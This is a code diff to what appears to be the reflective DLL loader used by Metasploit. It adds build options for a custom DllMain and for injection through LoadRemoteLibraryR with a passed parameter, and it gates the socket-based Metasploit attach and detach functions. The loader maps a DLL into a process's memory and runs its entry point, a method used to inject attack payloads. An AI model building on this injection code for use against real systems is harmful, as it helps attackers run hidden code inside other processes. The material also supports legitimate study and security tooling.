@@ -27,9 +27,6 @@
 //===============================================================================================//
 #include "ReflectiveLoader.h"
 //===============================================================================================//
-// you must implement this function...
-extern DWORD DLLEXPORT Init( SOCKET socket );
-//===============================================================================================//
 // Our loader will set this to a pseudo correct HINSTANCE/HMODULE value
 HINSTANCE hAppInstance = NULL;
 //===============================================================================================//
@@ -38,8 +35,19 @@ HINSTANCE hAppInstance = NULL;
 UINT_PTR eip( VOID ) { return (UINT_PTR)_ReturnAddress(); }
 #endif
 //===============================================================================================//
-// This is our position independent reflective Dll loader/injector
+
+// Note 1: If you want to have your own DllMain, define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN,  
+//         otherwise the DllMain at the end of this file will be used.
+
+// Note 2: If you are injecting the DLL via LoadRemoteLibraryR, define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR,
+//         otherwise it is assumed you are calling the ReflectiveLoader via a stub.
+
+// This is our position independent reflective DLL loader/injector
+#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
+DLLEXPORT UINT_PTR WINAPI ReflectiveLoader( LPVOID lpParameter )
+#else
 DLLEXPORT UINT_PTR WINAPI ReflectiveLoader( VOID )
+#endif
 {
 	// the functions we need
 	LOADLIBRARYA pLoadLibraryA;
@@ -366,22 +374,33 @@ DLLEXPORT UINT_PTR WINAPI ReflectiveLoader( VOID )
 */
 	// STEP 7: call our images entry point
 
-	// uiValueA = the VA of our newly loaded DLL's entry point
+	// uiValueA = the VA of our newly loaded DLL/EXE's entry point
 	uiValueA = ( uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint );
 
-	// call our DLLMain(), fudging our hinstDLL value
+	// call our respective entry point, fudging our hInstance value
+#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
+	// if we are injecting a DLL via LoadRemoteLibraryR we call DllMain and pass in our parameter (via the DllMain lpReserved parameter)
+	((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, lpParameter );
+#else
+	// if we are injecting an DLL via a stub we call DllMain with no parameter
 	((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, NULL );
+#endif
 
-	// STEP 8: return our new DllMain address so whatever called us can call DLL_METASPLOIT_ATTACH/DLL_METASPLOIT_DETACH
+	// STEP 8: return our new entry point address so whatever called us can call DLL_METASPLOIT_ATTACH/DLL_METASPLOIT_DETACH
 	return uiValueA;
 }
 //===============================================================================================//
+#ifndef REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
+
+// you must implement this function...
+extern DWORD DLLEXPORT Init( SOCKET socket );
+
 BOOL MetasploitDllAttach( SOCKET socket )
 {
 	Init( socket );
 	return TRUE;
 }
-//===============================================================================================//
+
 BOOL MetasploitDllDetach( DWORD dwExitFunc )
 {
 	switch( dwExitFunc )
@@ -401,7 +420,7 @@ BOOL MetasploitDllDetach( DWORD dwExitFunc )
 
 	return TRUE;
 }
-//===============================================================================================//
+
 BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
 {
     BOOL bReturnValue = TRUE;
@@ -427,4 +446,6 @@ BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
     }
 	return bReturnValue;
 }
+
+#endif
 //===============================================================================================//
